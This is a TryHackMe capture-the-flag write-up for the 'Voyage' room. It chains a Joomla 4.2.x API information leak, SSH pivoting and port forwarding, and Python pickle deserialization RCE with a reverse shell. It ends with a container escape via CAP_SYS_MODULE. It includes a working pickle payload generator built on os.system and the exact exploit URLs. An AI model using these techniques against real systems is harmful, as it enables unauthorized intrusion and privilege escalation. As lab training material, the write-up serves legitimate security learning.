# Voyage

https://tryhackme.com/r/voyage

A medium rated room, but quite involved. Took me a few hours.

1. Scans reveal 22, 80 and 2222, with the first and last both being ssh ports obviously
2. On 80 is a joomla site, specifically version 4.2.x, which can be discovered easily via nikto, nmap returns, and reading the README.txt file
3. This version has a info disclosure vuln, at these addresses:
  - http://10.201.107.142/api/index.php/v1/config/application?public=true
  - http://10.201.107.142/api/index.php/v1/users?public=true
  This reveals a set of credentials, which sadly do not work on the site.
4. They *do* work on port 2222 though, gaining root access to a container over ssh
5. The bash history file for root contains a list of the installed apps, including fully functional nmap, which allows us to do network enum
6. On a 192.168.100.12 machine, port 5000 is open and curling it reveals a website
7. I set up a proxy so this site was accessible from my attach box, via `ssh -p 2222 -L 0.0.0.0:5000:192.168.100.12:5000 root@10.201.107.142`
8. The website is a 'secret finance portal', and can be logged in with the same set of credentials as earler.
9. The site itself, and the finance panel, have no interesting functionality. However the cookie is a hex value that can be parsed to reveal some plaintext along with plenty of garbage.
10. Given the site is running using werkzeug and python3, and the first bunch of bytes in the cookie, this all leads to pickle serialization. The following script successfully decodes the cookie:

  ```python
  import pickle

  cookie = "8004952b00000000....."
  
  pickle_bytes = bytes.fromhex(cookie)
  data = pickle.loads(pickle_bytes)
  print(data)
  ```

11. To test for unsafe deserialization, I used this script to generate payloads:

  ```python
  import pickle
  import base64
  import os
  import sys
  
  class RCE:
      def __reduce__(self):
          cmd = (sys.argv[1])
          return os.system, (cmd,)
  
  if __name__ == '__main__':
      pickled = pickle.dumps(RCE())
      print(pickled.hex())
  ```
  After trying curl, I got a call back, and then used a python3 rev shell to get a connection.

12. On the second docker container there are a bunch of kernel module files under /root, and evidence of kernel module installation in the bash history. linpeas showed that the root user had the `CAP_SYS_MODULE` capalbility.
13. As the kernel accessible from the docker container is the same kernel as what is running on the host, this allows an escape by creating a malicious module. I followed the instructions on hacktricks for this to get a root shell on the host: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html#cap_sys_module
  
One minor wrinkle was that the makefile tries to find the module build tools incorrectly - you need to sub out the uname -a stuff with the actual available paths under /lib/modules
